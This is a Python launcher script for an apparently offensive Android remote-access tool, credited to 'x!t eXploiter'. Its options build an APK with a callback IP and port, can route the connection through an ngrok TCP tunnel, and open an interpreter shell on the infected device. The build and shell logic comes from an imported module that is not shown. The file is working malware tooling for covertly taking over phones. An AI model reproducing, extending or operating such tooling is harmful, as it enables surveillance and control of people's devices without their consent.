#!/usr/bin/python
# -*- coding: utf-8 -*-

from main import *
import argparse
import sys
import platform
import socket  # ngrok ip resolution jonno lagbe

try:
    from pyngrok import ngrok, conf
except ImportError:
    print(stdOutput("error") + "\033[1mpyngrok not found\033[0m")
    print(stdOutput("info") + "\033[1mRun: pip3 install -r requirements.txt\033[0m")
    exit()

# Clear terminal/directory
clearDirec()

# Stylish Banner
print(r"""
 ██████╗░░░░██████╗░░░░░███████╗  ░   ░  ██████╗ ░░░░    █████╗     █████████
██╔════╝░░░░██╔══██╗░░░░██╔════╝    ░    ██╔══██╗░░     ██╔══██╗ ░░ ╚══██╔══╝░░░░
██║░░░░░░░░░██║░░██║░░░░█████╗  ░░  ░    ██████╔╝   ░   ███████║ ░░░   ██║ ░░░░ 
██║░░░░░░░░░██║░░██║░░░░██╔══╝ ░░   ░░ ░ ████═╝  ░░ ░   ██╔══██║ ░░░   ██║░░░░░  
╚██████╗░░░░██████╔╝░░░░██║      ░░      ██║ ██╚═╗      ██║  ██║ ░░░   ██║  ░░░░░ 
 ╚═════╝░ ░ ╚═════╝  ░░ ╚═╝  ░░      ░░  ██║   ██║ ░░   ╚═╝  ╚═╝ ░░  ░░╚═╝  ░░░
         ░          ░  ░░░  ░░   ░░      ╚═╝   ╚═╝░░░░░░░░░░░░░░░░░░░░░    ░░░ 
░░  ░░ ░                                 ░  ░░ ░░ ░░░░ ░░ 
""")
print("\033[93m- Upgraded Tool by x!t eXploiter !!\033[0m\n")

parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build', help='For Building the apk', action='store_true')
parser.add_argument('--shell', help='For getting the Interpreter', action='store_true')
parser.add_argument('--ngrok', help='For using ngrok', action='store_true')
parser.add_argument('-i', '--ip', metavar="<IP>", type=str, help='Enter the IP')
parser.add_argument('-p', '--port', metavar="<Port>", type=str, help='Enter the Port')
parser.add_argument('-o', '--output', metavar="<Apk Name>", type=str, help='Enter the apk Name')
parser.add_argument('-icon', '--icon', help='Visible Icon', action='store_true')
args = parser.parse_args()

# Python version check
py_version = float(platform.python_version()[:3])
if not (3.6 <= py_version <= 3.8):
    print(stdOutput("error") + "\033[1mPython version should be between 3.6 to 3.8\033[0m")
    sys.exit()

if args.build:
    port_ = args.port
    icon = True if args.icon else None
    if args.ngrok:
        conf.get_default().monitor_thread = False
        port = 8000 if not port_ else int(port_)
        tcp_tunnel = ngrok.connect(port, "tcp")
        ngrok_process = ngrok.get_ngrok_process()
        # url example: tcp://0.tcp.ngrok.io:12345
        domain_port = tcp_tunnel.public_url.split("://")[1]
        domain, port_str = domain_port.split(":")
        ip = socket.gethostbyname(domain)
        print(stdOutput("info") + f"\033[1mTunnel_IP: {ip} PORT: {port_str}\033[0m")
        build(ip, port_str, args.output, True, port_, icon)
    else:
        if args.ip and args.port:
            build(args.ip, port_, args.output, False, None, icon)
        else:
            print(stdOutput("error") + "\033[1mArguments Missing\033[0m")

if args.shell:
    if args.ip and args.port:
        get_shell(args.ip, args.port)
    else:
        print(stdOutput("error") + "\033[1mArguments Missing\033[0m")
